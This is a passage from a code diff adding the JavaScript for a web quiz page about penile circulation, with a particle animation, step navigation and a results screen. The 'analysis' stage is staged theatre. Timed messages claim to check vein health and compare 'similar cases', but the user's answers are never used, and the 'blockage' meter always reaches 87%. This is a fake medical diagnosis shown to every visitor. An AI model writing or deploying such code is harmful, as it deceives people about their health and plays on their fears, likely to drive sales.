+           BACKGROUND PARTICLES
+        ============================================================ */
+        (function() {
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+            let w, h;
+
+            function resize() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+            }
+            resize();
+            window.addEventListener('resize', resize);
+
+            for (let i = 0; i < 40; i++) {
+                particles.push({
+                    x: Math.random() * w,
+                    y: Math.random() * h,
+                    r: Math.random() * 1.5 + 0.3,
+                    vx: (Math.random() - 0.5) * 0.3,
+                    vy: (Math.random() - 0.5) * 0.3,
+                    o: Math.random() * 0.4 + 0.1
+                });
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0) p.x = w;
+                    if (p.x > w) p.x = 0;
+                    if (p.y < 0) p.y = h;
+                    if (p.y > h) p.y = 0;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(220, 38, 38, ${Math.min(p.o, 0.10)})`;
+                    ctx.fill();
+                });
+                requestAnimationFrame(draw);
+            }
+            draw();
+        })();
+
+        /* ============================================================
+           QUIZ LOGIC  (sound removed — no soundClick/soundSelect/soundDone calls)
+        ============================================================ */
+        document.addEventListener('DOMContentLoaded', () => {
+            const screens = document.querySelectorAll('.screen');
+            const steps = document.querySelectorAll('.step');
+            const total = steps.length;
+            let current = 0;
+            let answers = [];
+
+            const progressBar = document.getElementById('progressBar');
+            const stepLabel = document.getElementById('stepLabel');
+            const introScreen = document.getElementById('introScreen');
+            const stepsContainer = document.getElementById('stepsContainer');
+            const analysisScreen = document.getElementById('analysisScreen');
+            const resultScreen = document.getElementById('resultScreen');
+            const analysisTerminal = document.getElementById('analysisTerminal');
+
+            const circle = document.getElementById('circleProgress');
+            const pctDisplay = document.getElementById('pctDisplay');
+            const CIRCUM = 2 * Math.PI * 72;
+
+            const startBtn = document.getElementById('startBtn');
+
+            // ---- START ----
+            startBtn.addEventListener('click', () => {
+                introScreen.classList.remove('active');
+                stepsContainer.style.display = 'block';
+                showStep(0);
+            });
+
+            function updateProgress() {
+                const pct = ((current + 1) / total) * 100;
+                progressBar.style.width = pct + '%';
+                if (stepLabel) stepLabel.textContent = (current + 1) + ' / ' + total;
+            }
+
+            function showStep(index) {
+                steps.forEach((s, i) => {
+                    s.classList.remove('is-leaving');
+                    s.classList.toggle('active', i === index);
+                });
+                updateProgress();
+                fitToViewport();
+            }
+
+            function goNext() {
+                const activeStep = steps[current];
+
+                if (activeStep) {
+                    activeStep.classList.add('is-leaving');
+                }
+
+                setTimeout(() => {
+                    if (activeStep) {
+                        activeStep.classList.remove('active', 'is-leaving');
+                    }
+
+                    if (current < total - 1) {
+                        current++;
+                        showStep(current);
+                    } else {
+                        startAnalysis();
+                    }
+                }, 220);
+            }
+
+            document.querySelectorAll('.option').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const parent = this.closest('.step');
+                    parent.querySelectorAll('.option').forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+
+                    const val = this.getAttribute('data-value');
+                    const idx = parseInt(parent.getAttribute('data-step'));
+                    answers[idx] = val;
+
+                    setTimeout(goNext, 300);
+                });
+            });
+
+            /* ============================================================
+               ANALYSIS
+            ============================================================ */
+            function startAnalysis() {
+                stepsContainer.style.display = 'none';
+                analysisScreen.classList.add('active');
+                fitToViewport();
+
+                circle.style.strokeDasharray = CIRCUM;
+                circle.style.strokeDashoffset = CIRCUM;
+
+                const analysisMessages = [
+                    { text: 'Checking circulation patterns...', time: 0 },
+                    { text: 'Analysing penile vein health...', time: 900 },
+                    { text: 'Comparing with 12,847 similar cases...', time: 1900 },
+                    { text: 'Calculating recovery time...', time: 2900 },
+                    { text: 'Generating personalised diagnosis...', time: 3900 }
+                ];
+
+                analysisMessages.forEach((msg, i) => {
+                    setTimeout(() => {
+                        const line = document.createElement('div');
+                        line.className = 'line';
+                        const isLast = i === analysisMessages.length - 1;
+                        line.innerHTML = `<span class="dot${isLast ? ' done' : ''}"></span><span>${msg.text}${isLast ? ' <span class="check">✓</span>' : ''}</span>`;
+                        if (analysisTerminal) analysisTerminal.appendChild(line);
+                    }, msg.time);
+                });
+
+                let pct = 0;
+                const interval = setInterval(() => {
+                    pct += Math.floor(Math.random() * 3) + 1;
+                    if (pct > 100) pct = 100;
+                    const offset = CIRCUM - (pct / 100) * CIRCUM;
+                    circle.style.strokeDashoffset = offset;
+                    pctDisplay.innerHTML = pct + '<small>%</small>';
+
+                    if (pct === 100) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            analysisScreen.classList.remove('active');
+                            resultScreen.classList.add('active');
+                            fitToViewport();
+                            animateBlockMeter();
+                        }, 900);
+                    }
+                }, 60);
+            }
+
+            function animateBlockMeter() {
+                const fill = document.getElementById('blockFill');
+                const label = document.getElementById('blockLevel');
+                let val = 0;
+                const target = 87;
+                const interval = setInterval(() => {
+                    val += 2;
+                    if (val > target) val = target;
+                    fill.style.width = val + '%';
+                    label.textContent = val + '%';
+                    if (val >= target) clearInterval(interval);
+                }, 20);
+            }
+
+            showStep(0);
+        });
+
+        function fitToViewport() {
+            const card = document.getElementById('app');
+            if (!card) return;
+            card.style.transform = 'scale(1)';
+            const available = window.innerHeight - 32;
+            const needed = card.offsetHeight;
+            if (needed > available) {
+                const scale = available / needed;
+                card.style.transform = `scale(${scale})`;
+            }
+        }
+
+        window.addEventListener('load', fitToViewport);
+        window.addEventListener('resize', fitToViewport);
+        window.addEventListener('orientationchange', fitToViewport);
+    </script>
+
+</body>
+</html>
